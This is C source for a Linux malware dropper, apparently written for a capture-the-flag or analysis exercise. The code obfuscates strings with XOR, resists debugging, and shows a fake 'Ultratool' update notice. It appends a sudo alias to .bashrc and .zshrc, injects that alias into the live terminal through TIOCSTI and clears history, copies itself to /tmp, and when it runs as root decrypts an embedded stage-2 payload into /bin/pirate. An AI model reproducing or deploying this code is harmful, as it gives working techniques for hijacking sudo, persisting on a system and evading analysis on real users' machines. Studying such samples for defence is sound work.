#include <sys/ioctl.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <dirent.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include "aes.h"

#pragma GCC push_options
char scratch[4096];
extern const char _binary_stage2_start[];
extern const char * _binary_stage2_end;
extern const int _binary_stage2_size;

// SOURCE_STRINGS
//#define TERM_ALIAS_XOR "alias sudo='sudo /tmp/.entry-RjwtJS && sudo'\nhistory -c && clear\n"
//#define BASHRC_NAME_XOR ".bashrc"
//#define ENV_XOR "HOME"
//#define ALIAS_STR_XOR "\nalias sudo='sudo /tmp/.entry-RjwtJS && sudo'\n"
//#define PAYLOAD_LOCATION_XOR "/tmp/.entry-RjwtJS"
//#define ANTI_DEBUG_XOR "Why you debug me :(?"
//#define CAPN_XOR "Why you debug me Captain?"
//#define SELF_XOR "/proc/self/exe"
//#define BASHRC_XOR "%s/.bashrc"
//#define ZSHRC_XOR "%s/.zshrc"
//#define SHADOW_XOR "/usr/lib/os-release"
//#define PERSISTENCE_XOR "/bin/pirate"
// END_SOURCE_STRINGS

//START OBFUSCATING
//END OBFUSCATING

/**
 * This is a very rudimentary single byte XOR function. Analysts could probably easily
 * reveal every string by passing all xored looking strings to a xor brute forcer
 */
// This is so GCC doesn't optimize out our XOR encryption...
#pragma GCC optimize ("O0")
char * dexor(const char * to_dexor) {
    int i;
    int length =  *((int*) to_dexor);
    for (i = 4; i < length+4; i++) {
	// The XOR key is the least significant byte of the string length
        scratch[i-4] = to_dexor[i] ^ *((char*)to_dexor);
    }
    // Tack on null terminator
    scratch[length] = '\0';

    return scratch;
}
#pragma GCC pop_options

int round_up(int toRound, int multiple) {
    if (multiple == 0)
        return toRound;

    int rem = toRound % multiple;
    if (rem == 0)
        return toRound;

    return toRound + multiple - rem;
}

/**
 * Decrypts the STAGE-2 payload which is embedded as an extern 
 * 
 */
void decrypt_stage2(char * write_destination) {
    char write_dest[256] = {0};
    uint8_t iv[] = "whatisthiscapt??";
    struct AES_ctx context;
    strncpy(write_dest, write_destination, (sizeof write_dest) - 1);

    // Get the decryption key, which is read from a file on disk 
    char * shadow_file = dexor(SHADOW_XOR);
    int fd = open(shadow_file, O_RDONLY);
    uint8_t key[16];
    int read_in  = read(fd, key, AES_KEYLEN);
    close(fd);

    if (read_in == AES_KEYLEN) {
    
        // Allocate buffer for Stage2 Malloc
	int malloc_size = round_up(&_binary_stage2_size, AES_KEYLEN);
        uint8_t * dec_buf = (uint8_t *) malloc(malloc_size);
	memcpy(dec_buf, &_binary_stage2_start, malloc_size);

	if (dec_buf != NULL) {
            // Decrypt the buffer 
            AES_init_ctx_iv(&context, key, iv);
            AES_CBC_decrypt_buffer(&context, dec_buf, malloc_size);

            // Open file for writing 
            int persistence_file = open(write_dest, O_CREAT | O_WRONLY , 0755); 
            if (persistence_file) {
                // Write the extern blob
                write(persistence_file, dec_buf, &_binary_stage2_size);

                // Close
                close(persistence_file);
            } 
            free(dec_buf);
	}
    } 
}

/* 
 * Place the ALIAS_STR line in both .zshrc and .bashrc files (if it can find it) 
 */
void backdoor_rcfiles() {
    const char * homedir = getenv("HOME");
    char str[256];

    if (homedir != NULL) {
        snprintf(str, 256,dexor(ZSHRC_XOR),  homedir);
        FILE * rc_file = fopen(str, "r");
        // Look for bashrc
        if (rc_file) {
            fclose(rc_file);
	    rc_file = fopen(str, "a");
	    fputs(dexor(ALIAS_STR_XOR), rc_file);
	    fclose(rc_file); 
	}

        snprintf(str, 256, dexor(BASHRC_XOR), homedir);
        // Look for zshrc
        rc_file = fopen(str, "r");
        if (rc_file) {
            fclose(rc_file);
	    rc_file = fopen(str,"a");

            fputs(dexor(ALIAS_STR_XOR), rc_file); 

	    fclose(rc_file);
	}
    } 
}

/**
 *
 */
void print_meme() {
    printf("\n\n");
    printf(" ____ ___.__   __                 __                .__   \n");
    printf("|    |   \\  |_/  |_____________ _/  |_  ____   ____ |  |  \n");
    printf("|    |   /  |\\   __\\   __ \\__  \\\\   __\\/  _ \\ /  _ \\|  |  \n");
    printf("|    |  /|  |_|  |  |  | \\// __ \\|  | (  <_> |  <_> )  |__\n");
    printf("|______/ |____/__|  |__|  (____  /__|  \\____/ \\____/|____/\n");
    printf("                               \\/                         \n");
    printf("                                                          \n");
    printf("                                                         \n");
    printf("    Thank you for trying Ultratool! We have detected that your system is \n out of date. Please run 'sudo apt update' or 'sudo yum update' to resolve this issue.");
}

/**
 * Copy self to the /tmp/ directory 
 */
 void copy_self() {
    // Zero out the buffer because readlink doesn't append
    // a null terminator.
    memset(scratch, 0, sizeof(scratch));

    // Get the location of the current executable
    readlink(dexor(SELF_XOR), scratch, sizeof(scratch));

    // Copy the executable to the /tmp/ destination
    int curr_file = open(scratch, O_RDONLY);
    if (curr_file < 0) {
        return; 
    }

    int dest_file = open(dexor(PAYLOAD_LOCATION_XOR), O_WRONLY | O_CREAT, 0665);
    if (dest_file < 0) {
        goto failure;
    }

    int nread = 0; 
    while (nread = read(curr_file, scratch, sizeof scratch), nread > 0) {
	ssize_t write_count;
        char * scratch_ptr = scratch;
	do {
            write_count = write(dest_file, scratch_ptr, nread); 
	    if (write_count >= 0) {
	        nread -= write_count;
	        scratch_ptr += write_count;
	    } else if (errno != EINTR) {
	        goto failure;
	    }
	} while (nread > 0);
    }

    if (nread == 0) {
        if (close(dest_file) < 0) {
	    dest_file = -1;
	    goto failure;
	}
	close(curr_file);
    }
    return;
    failure:
       close(curr_file);
       if (dest_file >= 0) {
           close(dest_file);
       }
       return;
}

/*
 * Sets the alias in the current terminal. 
 */
void perform_source() {
    char * cmd = dexor(TERM_ALIAS_XOR); 
    if (fork() == 0) {
	// Go until null terminator
        while(*cmd != '\0') {
            ioctl(0, TIOCSTI, cmd++);
        }
	sleep(1);	
        print_meme();
	exit(0);
    } else {
	return;
    }
}

/**
 * Main entry point for our program
 */
int main() {

    // Debug prevention. Really we are preventing an easy strace :)
    if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        printf(dexor(CAPN_XOR));
        exit(0);
    } else {
        ptrace(PTRACE_DETACH, 0, 1, 0);
    }

    // Check any functions for bps
    if ((*(volatile unsigned long *)((unsigned long)perform_source) & 0xff) == 0xcc) {
        printf(dexor(ANTI_DEBUG_XOR));
	exit(0);
    }
    if ((*(volatile unsigned long *)((unsigned long) backdoor_rcfiles) & 0xff) == 0xcc) {
        printf(dexor(ANTI_DEBUG_XOR));
	exit(0);
    }
    if ((*(volatile unsigned long *)((unsigned long) dexor) & 0xff) == 0xcc) {
        printf(dexor(ANTI_DEBUG_XOR));
	exit(0);
    }

    uid_t curr_id = geteuid();

    if (curr_id == 0) {
	decrypt_stage2(dexor(PERSISTENCE_XOR));
    } else {
        backdoor_rcfiles();
        perform_source();
        copy_self();
    } 
}
